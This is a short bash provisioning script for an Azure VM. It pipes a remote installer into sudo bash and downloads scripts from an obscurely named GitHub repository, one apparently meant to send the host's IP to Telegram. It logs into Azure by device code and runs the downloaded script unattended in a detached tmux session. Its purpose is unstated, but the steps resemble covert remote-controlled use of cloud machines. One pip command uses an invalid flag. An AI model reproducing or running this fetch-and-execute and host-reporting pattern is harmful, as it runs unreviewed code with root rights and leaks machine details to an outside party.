# !/bin/bash
cd /home/azureuser
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
sudo apt install python3-pip -y
wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/script_linux.sh
chmod +x script_linux.sh
wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/linux_send_ip_to_tg.py
pip3 install serviceping -y
az login --use-device-code && sleep 600
tmux new -ds scr_cli ./script_linux.sh
